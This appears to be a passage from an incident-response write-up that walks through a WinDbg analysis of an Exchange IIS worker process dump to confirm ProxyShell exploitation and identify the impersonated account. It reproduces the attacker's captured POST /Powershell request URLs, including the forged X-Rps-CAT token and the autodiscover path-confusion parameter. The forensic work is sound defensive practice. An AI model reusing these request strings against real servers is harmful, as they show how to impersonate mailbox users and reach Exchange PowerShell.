Debug session time: Thu Nov  9 14:31:17.000 2023 (UTC - 8:00)
System Uptime: 0 days 0:06:05.323
Process Uptime: 0 days 0:02:31.000
  Kernel time: 0 days 0:00:02.000
  User time: 0 days 0:00:11.000
```

Let's ensure that the memory dump is correct, since as discussed previously. There are 14 IIS Worker Process managing a different Application Pool. The command **`!peb`** in WinDbg, with the **`!extensions/mex.dll.grep`** filtering for CommandLine, outputs the command line used to start the current process. In this case, it shows that an IIS worker process (w3wp.exe) was started for the application pool **MSExchangePowerShellAppPool**, which is indeed the correct one.

```
0:000> !extensions/mex.dll.grep CommandLine !peb
    CommandLine:  'c:\windows\system32\inetsrv\w3wp.exe -ap "MSExchangePowerShellAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config" -a \\.\pipe\iisipm832218aa-16c0-4935-9975-6c23ee07fd46 -h "C:\inetpub\temp\apppools\MSExchangePowerShellAppPool\MSExchangePowerShellAppPool.config" -w "" -m 0'
```

We will start with running the **`!mex.AspxPagesExt`** command which generates a report listing all current ASP.NET requests, including details such as address, completion status, timeouts, the time elapsed, thread IDs, return codes, HTTP verbs, and URLs for each request. The presence of the POST requests with the suspicious autodiscover already suggests suspicious activity, and from those requests. We can already observe that it's related to the ProxyShell exploitation. However, despite of this. Let's analyze further.

```
0:000> !Mex.AspxPagesExt
 Address          Completed Timeout Time (secs) ThreadId ReturnCode Verb Url
 0000014e39cb2408       yes     110                             200 POST /Powershell?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu
 0000014e3a453e40       yes     110                             200 POST /Powershell?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu
 0000014e3a457248       yes     110                             200 POST /Powershell?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu
 0000014e3a47f278       yes     110                             200 POST /Powershell?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu
 0000014e3a4dc2d0       yes     110                             200 POST /Powershell?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu
5 contexts found (5 displayed).
   AS == possibly async request
   SL == session locked
```

The **`!DisplayObj`** (or **`!do2`**) command displays the structure and details of CLR objects in memory, which we will be doing to inspect **`0x0000014e39cb2408`**

```
0:000> !DisplayObj 0x0000014e39cb2408
0x0000014e39cb2408 System.Web.HttpContext
[statics]
  0000  _asyncAppHandler                                          : NULL
  0008  _appInstance                                              : NULL
  0010  _handler                                                  : NULL
  0018  _request                                                  : 0000014e39cb25c8 (System.Web.HttpRequest)
  0020  _response                                                 : 0000014e39cb2750 (System.Web.HttpResponse)
  0028  _server                                                   : NULL
  0030  _traceContextStack                                        : NULL
  0038  _topTraceContext                                          : NULL
  0040  _items                                                    : NULL
  0048  _errors                                                   : NULL
  0050  _tempError                                                : NULL
  0058  _principalContainer                                       : 0000014e39cb2b60 (System.Web.RootedObjects)
  0060  _Profile                                                  : NULL
  0068  _wr                                                       : 0000014e39cb1bf8 (System.Web.Hosting.IIS7WorkerRequest)
  0070  _configurationPath                                        : NULL
  0078  _dynamicCulture                                           : 0000014e33528ab0 (System.Globalization.CultureInfo)
  0080  _dynamicUICulture                                         : 0000014e33528ab0 (System.Globalization.CultureInfo)
  0088  _handlerStack                                             : NULL
  0090  _pageInstrumentationService                               : NULL
  0098  _webSocketRequestedProtocols                              : NULL
  00a0  _timeoutCancellationTokenHelper                           : 0000014e3414e548 (System.Web.Util.CancellationTokenHelper)
  00a8  _timeoutLink                                              : NULL
  00b0  _thread                                                   : NULL
  00b8  _configurationPathData                                    : NULL
  00c0  _filePathData                                             : 0000014e335685b0 (System.Web.CachedPathData)
  00c8  _sqlDependencyCookie                                      : NULL
  00d0  _sessionStateModule                                       : NULL
  00d8  _templateControl                                          : NULL
  00e0  _notificationContext                                      : NULL
  00e8  IndicateCompletionContext                                 : NULL
  00f0  ThreadInsideIndicateCompletion                            : NULL
  00f8  ThreadContextId                                           : 0000014e39cb25b0 (System.Object)
  0100  _syncContext                                              : NULL
  0108  _threadWhichStartedWebSocketTransition                    : NULL
  0110  _webSocketNegotiatedProtocol                              : NULL
  0118  _remapHandler                                             : NULL
  0120  _currentHandler                                           : NULL
  0128  <System.Web.IPrincipalContainer.Principal>k__BackingField : NULL
  0130  _rootedObjects                                            : 0000014e39cb2b60 (System.Web.RootedObjects)
  0138  _CookielessHelper                                         : 0000014e39cb28a8 (System.Web.Security.CookielessHelperClass)
  0140  _timeoutStartTimeUtcTicks                                 : 638351658090498371 (System.Int64)
  0148  _timeoutTicks                                             : 1100000000 (System.Int64)
  0150  _rootedPtr                                                : 0000000000000000 (System.IntPtr)
  0158  _asyncPreloadModeFlags                                    : None (0) (System.Web.Configuration.AsyncPreloadModeFlags)
  015c  _serverExecuteDepth                                       : 0 (System.Int32)
  0160  _timeoutState                                             : 0 (System.Int32)
  0164  <SessionStateBehavior>k__BackingField                     : Default (0) (System.Web.SessionState.SessionStateBehavior)
  0168  _asyncPreloadModeFlagsSet                                 : False (System.Boolean)
  0169  _errorCleared                                             : False (System.Boolean)
  016a  _skipAuthorization                                        : False (System.Boolean)
  016b  _preventPostback                                          : False (System.Boolean)
  016c  _runtimeErrorReported                                     : False (System.Boolean)
  016d  _threadAbortOnTimeout                                     : True (System.Boolean)
  016e  _delayedSessionState                                      : False (System.Boolean)
  016f  _isAppInitialized                                         : True (System.Boolean)
  0170  _isIntegratedPipeline                                     : True (System.Boolean)
  0171  _finishPipelineRequestCalled                              : True (System.Boolean)
  0172  _impersonationEnabled                                     : False (System.Boolean)
  0173  HideRequestResponse                                       : False (System.Boolean)
  0174  InIndicateCompletion                                      : False (System.Boolean)
  0175  _webSocketTransitionState                                 : Inactive (0) (System.Web.WebSocketTransitionState)
  0176  <FirstRequest>k__BackingField                             : False (System.Boolean)
  0177  _requiresSessionStateFromHandler                          : False (System.Boolean)
  0178  _readOnlySessionStateFromHandler                          : False (System.Boolean)
  0179  InAspCompatMode                                           : False (System.Boolean)
  017a  <DisableCustomHttpEncoder>k__BackingField                 : False (System.Boolean)
  017b  _ProfileDelayLoad                                         : False (System.Boolean)
  0180  _utcTimestamp                                             : 0000014e39cb2590 11/9/2023 10:30:09 PM (System.DateTime)
  0188  _requestCompletedQueue                                    : 0000014e39cb2598 (System.Web.Util.SubscriptionQueue<System.Action<System.Web.HttpContext>>)
  0190  _pipelineCompletedQueue                                   : 0000014e39cb25a0 (System.Web.Util.SubscriptionQueue<System.IDisposable>)
```

This output represents the properties of an **`System.Web.Hosting.IIS7WorkerRequest`** object in memory which includes the POST request of ProxyShell.

```
0:000> !mex.DisplayObj 0x0000014e39cb1bf8
0x0000014e39cb1bf8 System.Web.Hosting.IIS7WorkerRequest
[statics]
  0000  _isInReadEntitySync          : False (System.Boolean)
  0008  _startTime                   : 0000014e39cb1c08 11/9/2023 10:30:09 PM (System.DateTime)
  0010  _traceId                     : 0000014e39cb1c10 00000000-0000-0000-0000-000000000000 (System.Guid)
  0020  _headerEncoding              : 0000014e33535198 (System.Text.UTF8Encoding)
  0028  _asyncResultBase             : NULL
  0030  _appPath                     : 0000014e39cb2320  "/PowerShell" [11] (System.String)
  0038  _appPathTranslated           : 0000014e39cb2350  "C:\Program Files\Microsoft\Exchange Serv..." [77] (System.String)
  0040  _path                        : 0000014e39cb20a0  "/Powershell" [11] (System.String)
  0048  _queryString                 : 0000014e39cb2100  "X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTB..." [258] (System.String)
  0050  _filePath                    : 0000014e39cb20a0  "/Powershell" [11] (System.String)
  0058  _pathInfo                    : 0000014e334d1420  "" [0] (System.String)
  0060  _pathTranslated              : 0000014e39cb1fc0  "C:\Program Files\Microsoft\Exchange Serv..." [76] (System.String)
  0068  _httpVerb                    : 0000014e39cb2078  "POST" [4] (System.String)
  0070  _unknownRequestHeaders       : 0000014e39cb98a0 (System.String[][]) [Length: 12]
  0078  _knownRequestHeaders         : 0000014e39cb3de0 (System.String[]) [Length: 40]
  0080  _cachedResponseBodyBytes     : NULL
  0088  _preloadedContent            : NULL
  0090  _cacheUrl                    : 0000014e39cb1d40  "https://exchange2012.contoso.com:444/Pow..." [306] (System.String)
  0098  _clientCert                  : NULL
  00a0  _clientCertPublicKey         : NULL
  00a8  _clientCertBinaryIssuer      : NULL
  00b0  _channelBindingToken         : NULL
  00b8  _disposeLockObj              : 0000014e39cb1d28 (System.Object)
  00c0  _clientDisconnectTokenHelper : NULL
  00c8  _allocator                   : 0000014e3406e9c0 (System.Web.AllocatorProvider)
  00d0  _context                     : 0000000000000000 (System.IntPtr)
  00d8  _pCookedUrl                  : 0000000000000000 (System.IntPtr)
  00e0  _contentType                 : 3 (System.Int32)
  00e4  _contentTotalLength          : 1861 (System.Int32)
  00e8  _cachedResponseBodyLength    : 0 (System.Int32)
  00ec  _preloadedLength             : 0 (System.Int32)
  00f0  _clientCertEncoding          : 0 (System.Int32)
  00f4  _rewriteNotifyDisabled       : False (System.Boolean)
  00f5  _rebaseClientPath            : False (System.Boolean)
  00f6  _requestHeadersAvailable     : True (System.Boolean)
  00f7  _preloadedLengthRead         : True (System.Boolean)
  00f8  _preloadedContentRead        : True (System.Boolean)
  00f9  _traceEnabled                : False (System.Boolean)
  00fa  _connectionClosed            : False (System.Boolean)
  00fb  _disconnected                : False (System.Boolean)
  00fc  _headersSent                 : False (System.Boolean)
  00fd  _trySkipIisCustomErrors      : False (System.Boolean)
  00fe  _clientCertFetched           : False (System.Boolean)
  0100  _traceId                     : 0000014e39cb1d00 00000000-0000-0000-0000-000000000000 (System.Guid)
  0110  _clientCertValidFrom         : 0000014e39cb1d10 1/1/0001 12:00:00 AM (System.DateTime)
  0118  _clientCertValidUntil        : 0000014e39cb1d18 1/1/0001 12:00:00 AM (System.DateTime)
```

The **`!ForEachObject -s -x "!do2 @#Obj" System.Web.HttpRequest`** command in WinDbg iterates over all instances of the **`System.Web.HttpRequest`** class in memory and executes the **`!do2`** command on each instance.

```
0:000> !ForEachObject -s -x "!do2 @#Obj" System.Web.HttpRequest
0x0000014e39cb25c8 System.Web.HttpRequest
[statics]
  0000  _wr                          : 0000014e39cb1bf8 (System.Web.Hosting.IIS7WorkerRequest)
  0008  _context                     : 0000014e39cb2408 (System.Web.HttpContext)
  0010  _httpMethod                  : 0000014e39cb2078  "POST" [4] (System.String)
  0018  _requestType                 : NULL
  0020  _path                        : 0000014e39cb3bf0 (System.Web.VirtualPath)
  0028  _rewrittenUrl                : NULL
  0030  _filePath                    : 0000014e39cb2de8 (System.Web.VirtualPath)
  0038  _currentExecutionFilePath    : NULL
  0040  _pathInfo                    : NULL
  0048  _queryStringText             : 0000014e39cb9b50  "X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTB..." [258] (System.String)
  0050  _queryStringBytes            : 0000014e39cb3c18 (System.Byte[]) [Length: 258]
  0058  _pathTranslated              : 0000014e39cb1fc0  "C:\Program Files\Microsoft\Exchange Serv..." [76] (System.String)
  0060  _contentType                 : 0000014e39cb5c90  "application/soap+xml;charset=UTF-8" [34] (System.String)
  0068  _clientTarget                : NULL
  0070  _acceptTypes                 : NULL
  0078  _userLanguages               : NULL
  0080  _browsercaps                 : NULL
  0088  _url                         : 0000014e39cbd720 https://exchange2012.contoso.com:444/Powershell?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu (System.Uri)
  0090  _referrer                    : NULL
  0098  _inputStream                 : 0000014e39cbdff8 (System.Web.HttpInputStream)
  00a0  _clientCertificate           : NULL
  00a8  _tlsTokenBindingInfo         : NULL
  00b0  _logonUserIdentity           : NULL
  00b8  _requestContext              : NULL
  00c0  _rawUrl                      : 0000014e39cb28d0  "/Powershell?X-Rps-CAT=VgEAVAdXaW5kb3dzQw..." [270] (System.String)
  00c8  _readEntityBodyStream        : NULL
  00d0  _unvalidatedRequestValues    : NULL
  00d8  _params                      : NULL
  00e0  _queryString                 : NULL
  00e8  _form                        : NULL
  00f0  _headers                     : 0000014e39cbaf48 (System.Web.HttpHeaderCollection)
  00f8  _serverVariables             : 0000014e39cc68c0 (System.Web.HttpServerVarsCollection)
  0100  _cookies                     : 0000014e3a452a38 (System.Web.HttpCookieCollection)
  0108  _storedResponseCookies       : NULL
  0110  _files                       : NULL
  0118  _rawContent                  : 0000014e39cbd848 (System.Web.HttpRawUploadedContent)
  0120  _multipartContentElements    : NULL
  0128  _encoding                    : 0000014e33535198 (System.Text.UTF8Encoding)
  0130  _filterSource                : NULL
  0138  _installedFilter             : NULL
  0140  _anonymousId                 : NULL
  0148  _clientFilePath              : 0000014e39cb2b38 (System.Web.VirtualPath)
  0150  _clientBaseDir               : NULL
  0158  _httpVerb                    : POST (5) (System.Web.HttpVerb)
  015c  _contentLength               : 1861 (System.Int32)
  0160  _readEntityBodyMode          : Classic (1) (System.Web.ReadEntityBodyMode)
  0164  _computePathInfo             : False (System.Boolean)
  0165  _queryStringOverriden        : False (System.Boolean)
  0166  _tlsTokenBindingInfoResolved : False (System.Boolean)
  0167  _needToInsertEntityBody      : False (System.Boolean)
  0168  _filterApplied               : False (System.Boolean)
  0170  _flags                       : 0000014e39cb2740 (System.Web.Util.SimpleBitVector32)
--------------------------------------------------------------------------------

<<< SNIPPET >>>
```

The **`_queryStringBytes`** field in the **`System.Web.HttpRequest`** object is an array of bytes representing the query string in byte-encoded form.

```
0:000> !mex.DisplayObj 0x0000014e39cb3c18
[raw] 0000014e39cb3c18 System.Byte[] Length: 258
00000000   58 2D 52 70 73 2D 43 41 54 3D 56 67  45 41 56 41 64 58 61 57 35 6B 62 33    X-Rps-CAT=Vg EAVAdXaW5kb3
00000018   64 7A 51 77 42 42 42 55 4A 68 63 32  6C 6A 54 42 46 4B 62 32 35 6C 63 30    dzQwBBBUJhc2 ljTBFKb25lc0
00000030   42 6A 62 32 35 30 62 33 4E 76 4C 6D  4E 76 62 56 55 73 55 79 30 78 4C 54    Bjb250b3NvLm NvbVUsUy0xLT
00000048   55 74 4D 6A 45 74 4D 6A 6B 31 4E 54  6B 31 4E 44 63 31 4D 79 30 79 4D 44    UtMjEtMjk1NT k1NDc1My0yMD
00000060   67 32 4E 7A 45 32 4F 44 41 34 4C 54  55 32 4D 7A 59 79 4D 7A 4D 33 4E 69    g2NzE2ODA4LT U2MzYyMzM3Ni
00000078   30 31 4D 44 42 48 42 41 41 41 41 41  63 41 41 41 41 48 55 79 30 78 4C 54    01MDBHBAAAAA cAAAAHUy0xLT
00000090   45 74 4D 41 63 41 41 41 41 48 55 79  30 78 4C 54 55 74 4D 67 63 41 41 41    EtMAcAAAAHUy 0xLTUtMgcAAA
000000A8   41 49 55 79 30 78 4C 54 55 74 4D 54  45 48 41 41 41 41 43 46 4D 74 4D 53    AIUy0xLTUtMT EHAAAACFMtMS
000000C0   30 31 4C 54 45 31 52 51 41 41 41 41  41 3D 26 45 6D 61 69 6C 3D 61 75 74    01LTE1RQAAAA A=&Email=aut
000000D8   6F 64 69 73 63 6F 76 65 72 2F 61 75  74 6F 64 69 73 63 6F 76 65 72 2E 6A    odiscover/au todiscover.j
000000F0   73 6F 6E 25 33 46 40 66 75 63 6B 79  30 75 2E 65 64 75                      son%3F@fucky 0u.edu
```

ProxyShell typically require an attacker to specify an account that has an associated mailbox, but which account was specified by the attacker to do so? To determine which specific account the attacker employed, let's investigate further.

The command **`!ForEachObject -s -x "!do2 @#Obj" System.Security.Principal.GenericIdentity`** iterates over each instance of the **`System.Security.Principal.GenericIdentity`** class in memory, executing the **`!do2`** command on each instance to display its detailed properties. 

```
0:000> !ForEachObject -s -x "!do2 @#Obj" System.Security.Principal.GenericIdentity
0x0000014e33c46e18 System.Security.Principal.GenericIdentity
  0000  m_userSerializationData : NULL
  0008  m_instanceClaims        : 0000014e33c46ea0 (System.Collections.Generic.List<System.Security.Claims.Claim>) [Length: 1]
  0010  m_externalClaims        : 0000014e33c46ec8 (System.Collections.ObjectModel.Collection<System.Collections.Generic.IEnumerable<System.Security.Claims.Claim>>)
  0018  m_nameType              : 0000014e334d8fc8  "http://schemas.xmlsoap.org/ws/2005/05/id..." [58] (System.String)
  0020  m_roleType              : 0000014e334d91b8  "http://schemas.microsoft.com/ws/2008/06/..." [60] (System.String)
  0028  m_version               : 0000014e334d90f8  "1.0" [3] (System.String)
  0030  m_actor                 : NULL
  0038  m_authenticationType    : NULL
  0040  m_bootstrapContext      : NULL
  0048  m_label                 : NULL
  0050  m_serializedNameType    : NULL
  0058  m_serializedRoleType    : NULL
  0060  m_serializedClaims      : NULL
  0068  m_name                  : 0000014e33c456a0  "host/localhost" [14] (System.String)
  0070  m_type                  : 0000014e33c456d8  "NTLM" [4] (System.String)
--------------------------------------------------------------------------------
0x0000014e33c47188 System.Security.Principal.GenericIdentity
  0000  m_userSerializationData : NULL
  0008  m_instanceClaims        : 0000014e33c47210 (System.Collections.Generic.List<System.Security.Claims.Claim>) [Length: 1]
  0010  m_externalClaims        : 0000014e33c47238 (System.Collections.ObjectModel.Collection<System.Collections.Generic.IEnumerable<System.Security.Claims.Claim>>)
  0018  m_nameType              : 0000014e334d8fc8  "http://schemas.xmlsoap.org/ws/2005/05/id..." [58] (System.String)
  0020  m_roleType              : 0000014e334d91b8  "http://schemas.microsoft.com/ws/2008/06/..." [60] (System.String)
  0028  m_version               : 0000014e334d90f8  "1.0" [3] (System.String)
  0030  m_actor                 : NULL
  0038  m_authenticationType    : NULL
  0040  m_bootstrapContext      : NULL
  0048  m_label                 : NULL
  0050  m_serializedNameType    : NULL
  0058  m_serializedRoleType    : NULL
  0060  m_serializedClaims      : NULL
  0068  m_name                  : 0000014e33c456a0  "host/localhost" [14] (System.String)
  0070  m_type                  : 0000014e334d1420  "" [0] (System.String)
--------------------------------------------------------------------------------
0x0000014e33ff3d08 System.Security.Principal.GenericIdentity
  0000  m_userSerializationData : NULL
  0008  m_instanceClaims        : 0000014e33ff3d90 (System.Collections.Generic.List<System.Security.Claims.Claim>) [Length: 1]
  0010  m_externalClaims        : 0000014e33ff3db8 (System.Collections.ObjectModel.Collection<System.Collections.Generic.IEnumerable<System.Security.Claims.Claim>>)
  0018  m_nameType              : 0000014e334d8fc8  "http://schemas.xmlsoap.org/ws/2005/05/id..." [58] (System.String)
  0020  m_roleType              : 0000014e334d91b8  "http://schemas.microsoft.com/ws/2008/06/..." [60] (System.String)
  0028  m_version               : 0000014e334d90f8  "1.0" [3] (System.String)
  0030  m_actor                 : NULL
  0038  m_authenticationType    : NULL
  0040  m_bootstrapContext      : NULL
  0048  m_label                 : NULL
  0050  m_serializedNameType    : NULL
  0058  m_serializedRoleType    : NULL
  0060  m_serializedClaims      : NULL
  0068  m_name                  : 0000014e33ff3a48  "host/exchange2012" [17] (System.String)
  0070  m_type                  : 0000014e33c456d8  "NTLM" [4] (System.String)
--------------------------------------------------------------------------------
0x0000014e33ff3fa0 System.Security.Principal.GenericIdentity
  0000  m_userSerializationData : NULL
  0008  m_instanceClaims        : 0000014e33ff4028 (System.Collections.Generic.List<System.Security.Claims.Claim>) [Length: 1]
  0010  m_externalClaims        : 0000014e33ff4050 (System.Collections.ObjectModel.Collection<System.Collections.Generic.IEnumerable<System.Security.Claims.Claim>>)
  0018  m_nameType              : 0000014e334d8fc8  "http://schemas.xmlsoap.org/ws/2005/05/id..." [58] (System.String)
  0020  m_roleType              : 0000014e334d91b8  "http://schemas.microsoft.com/ws/2008/06/..." [60] (System.String)
  0028  m_version               : 0000014e334d90f8  "1.0" [3] (System.String)
  0030  m_actor                 : NULL
  0038  m_authenticationType    : NULL
  0040  m_bootstrapContext      : NULL
  0048  m_label                 : NULL
  0050  m_serializedNameType    : NULL
  0058  m_serializedRoleType    : NULL
  0060  m_serializedClaims      : NULL
  0068  m_name                  : 0000014e33ff3a48  "host/exchange2012" [17] (System.String)
  0070  m_type                  : 0000014e334d1420  "" [0] (System.String)
--------------------------------------------------------------------------------
0x0000014e3409ff10 System.Security.Principal.GenericIdentity
  0000  m_userSerializationData : NULL
  0008  m_instanceClaims        : 0000014e3409ff98 (System.Collections.Generic.List<System.Security.Claims.Claim>) [Length: 1]
  0010  m_externalClaims        : 0000014e3409ffc0 (System.Collections.ObjectModel.Collection<System.Collections.Generic.IEnumerable<System.Security.Claims.Claim>>)
  0018  m_nameType              : 0000014e334d8fc8  "http://schemas.xmlsoap.org/ws/2005/05/id..." [58] (System.String)
  0020  m_roleType              : 0000014e334d91b8  "http://schemas.microsoft.com/ws/2008/06/..." [60] (System.String)
  0028  m_version               : 0000014e334d90f8  "1.0" [3] (System.String)
  0030  m_actor                 : NULL
  0038  m_authenticationType    : NULL
  0040  m_bootstrapContext      : NULL
  0048  m_label                 : NULL
  0050  m_serializedNameType    : NULL
  0058  m_serializedRoleType    : NULL
  0060  m_serializedClaims      : NULL
  0068  m_name                  : 0000014e3409fcf8  "Anonymous" [9] (System.String)
  0070  m_type                  : 0000014e334d1420  "" [0] (System.String)
--------------------------------------------------------------------------------
0x0000014e340a0188 System.Security.Principal.GenericIdentity
  0000  m_userSerializationData : NULL
  0008  m_instanceClaims        : 0000014e340a0210 (System.Collections.Generic.List<System.Security.Claims.Claim>) [Length: 1]
  0010  m_externalClaims        : 0000014e340a0238 (System.Collections.ObjectModel.Collection<System.Collections.Generic.IEnumerable<System.Security.Claims.Claim>>)
  0018  m_nameType              : 0000014e334d8fc8  "http://schemas.xmlsoap.org/ws/2005/05/id..." [58] (System.String)
  0020  m_roleType              : 0000014e334d91b8  "http://schemas.microsoft.com/ws/2008/06/..." [60] (System.String)
  0028  m_version               : 0000014e334d90f8  "1.0" [3] (System.String)
  0030  m_actor                 : NULL
  0038  m_authenticationType    : NULL
  0040  m_bootstrapContext      : NULL
  0048  m_label                 : NULL
  0050  m_serializedNameType    : NULL
  0058  m_serializedRoleType    : NULL
  0060  m_serializedClaims      : NULL
  0068  m_name                  : 0000014e3409fcf8  "Anonymous" [9] (System.String)
  0070  m_type                  : 0000014e334d1420  "" [0] (System.String)
--------------------------------------------------------------------------------
0x0000014e340c8ee8 System.Security.Principal.GenericIdentity
  0000  m_userSerializationData : NULL
  0008  m_instanceClaims        : 0000014e340c9680 (System.Collections.Generic.List<System.Security.Claims.Claim>) [Length: 1]
  0010  m_externalClaims        : 0000014e340c96a8 (System.Collections.ObjectModel.Collection<System.Collections.Generic.IEnumerable<System.Security.Claims.Claim>>)
  0018  m_nameType              : 0000014e334d8fc8  "http://schemas.xmlsoap.org/ws/2005/05/id..." [58] (System.String)
  0020  m_roleType              : 0000014e334d91b8  "http://schemas.microsoft.com/ws/2008/06/..." [60] (System.String)
  0028  m_version               : 0000014e334d90f8  "1.0" [3] (System.String)
  0030  m_actor                 : NULL
  0038  m_authenticationType    : NULL
  0040  m_bootstrapContext      : NULL
  0048  m_label                 : NULL
  0050  m_serializedNameType    : NULL
  0058  m_serializedRoleType    : NULL
  0060  m_serializedClaims      : NULL
  0068  m_name                  : 0000014e340ac680  "jones@contoso.com" [17] (System.String)
  0070  m_type                  : 0000014e340c8f70  "Cafe-WindowsIdentity;[{"Key":"Item-Ident..." [890] (System.String)
--------------------------------------------------------------------------------

<<< SNIPPET >>>
```

It looks like the user **`Jones@contoso.com`** was used during the ProxyShell attack. The memory address **`0000014e340c8f70`** contains the **`m_type`** field of a **`System.Security.Principal.GenericIdentity`** object. This field contains some interesting data, as we can see here:

```
0:000> !mex.DisplayObj -raw 0x0000014e39cd3ef0
0x0000014e39cd3ef0 System.String
Cafe-WindowsIdentity;[{"Key":"Item-Identity","Value":"<%3fX-Rps-CAT%3dVgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA%3d%26Email%3dautodiscover%2fautodiscover.json%3f%40fucky0u.edu><jones@contoso.com><Cafe-WindowsIdentity>"},{"Key":"Item-SessionId","Value":null},{"Key":"Item-RequestId","Value":"5dd386c6-6672-4d49-be4a-91e2122cd311"},{"Key":"X-EX-UserToken","Value":"VgAAQQhLZXJiZXJvc0QBMEwBME4RSm9uZXNAY29udG9zby5jb21VMFMtMS01LTIxLTI5NTU5NTQ3NTMtMlwwODY3MTY4XDA4LTU2MzYyMzM3Ni01XDBcMFABME8IQVFBQUFBQUFNATBXAB+LCAAAAAAABABVjMEOgjAMhl9pG3L0sLkRRDqDbqhHNxIU8CRBt6e3YGJik7\/N17Rf3Spe8+Z8PaW9S5pYvYQQtrh5NnRGZDvH0sET0eEkLtFT+dCTq+3TBvIujR2hU5ieaoORnkIgAWTLdFRsL\/kKbxjES4AIib4TClLkgs\/l55Z\/Pej4Y\/S2C29\/bFQ+LzYZjHAkFH\/ooVpE6w+Q37azxAAAAA=="}]
[statics]
  0000  m_stringLength : 890 (System.Int32)
  0004  m_firstChar    : C (System.Char)
```

```
0000014e`39cd2788  43 61 66 65 2d 57 69 6e-64 6f 77 73 49 64 65 6e  Cafe-WindowsIden
0000014e`39cd2798  74 69 74 79 3e 22 7d 2c-7b 22 4b 65 79 22 3a 22  tity>"},{"Key":"
0000014e`39cd27a8  49 74 65 6d 2d 53 65 73-73 69 6f 6e 49 64 22 2c  Item-SessionId",
0000014e`39cd27b8  22 56 61 6c 75 65 22 3a-6e 75 6c 6c 7d 2c 7b 22  "Value":null},{"
0000014e`39cd27c8  4b 65 79 22 3a 22 49 74-65 6d 2d 52 65 71 75 65  Key":"Item-Reque
0000014e`39cd27d8  73 74 49 64 22 2c 22 56-61 6c 75 65 22 3a 22 35  stId","Value":"5
0000014e`39cd27e8  64 64 33 38 36 63 36 2d-36 36 37 32 2d 34 64 34  dd386c6-6672-4d4
0000014e`39cd27f8  39 2d 62 65 34 61 2d 39-31 65 32 31 32 32 63 64  9-be4a-91e2122cd
0000014e`39cd2808  33 31 31 22 7d 2c 7b 22-4b 65 79 22 3a 22 58 2d  311"},{"Key":"X-
0000014e`39cd2818  45 58 2d 55 73 65 72 54-6f 6b 65 6e 22 2c 22 56  EX-UserToken","V
0000014e`39cd2828  61 6c 75 65 22 3a 22 00-00 00 00 00 00 00 00 00  alue":".........
0000014e`39cd2838  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0000014e`39cd2848  a0 aa 39 51 fa 7f 00 00-00 04 00 00 00 00 00 00  ..9Q............
0000014e`39cd2858  5b 7b 22 4b 65 79 22 3a-22 49 74 65 6d 2d 49 64  [{"Key":"Item-Id
0000014e`39cd2868  65 6e 74 69 74 79 22 2c-22 56 61 6c 75 65 22 3a  entity","Value":
0000014e`39cd2878  22 3c 25 33 66 58 2d 52-70 73 2d 43 41 54 25 33  "<%3fX-Rps-CAT%3
0000014e`39cd2888  64 56 67 45 41 56 41 64-58 61 57 35 6b 62 33 64  dVgEAVAdXaW5kb3d
0000014e`39cd2898  7a 51 77 42 42 42 55 4a-68 63 32 6c 6a 54 42 46  zQwBBBUJhc2ljTBF
0000014e`39cd28a8  4b 62 32 35 6c 63 30 42-6a 62 32 35 30 62 33 4e  Kb25lc0Bjb250b3N
0000014e`39cd28b8  76 4c 6d 4e 76 62 56 55-73 55 79 30 78 4c 54 55  vLmNvbVUsUy0xLTU
